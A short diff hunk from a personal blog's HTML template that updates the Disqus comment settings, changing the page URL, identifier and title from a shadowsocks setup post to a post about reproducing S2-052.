@@ -863,9 +858,9 @@
     
       <script type="text/javascript">
         var disqus_config = function () {
-          this.page.url = 'http://y-hkl.top/2017/09/02/搭建shadowsocks服务/';
-          this.page.identifier = '2017/09/02/搭建shadowsocks服务/';
-          this.page.title = '搭建shadowsocks服务';
+          this.page.url = 'http://y-hkl.top/2017/09/08/s2-052复现/';
+          this.page.identifier = '2017/09/08/s2-052复现/';
+          this.page.title = 's2-052复现';
         };
         var d = document, s = d.createElement('script');
         s.src = 'https://.disqus.com/embed.js';
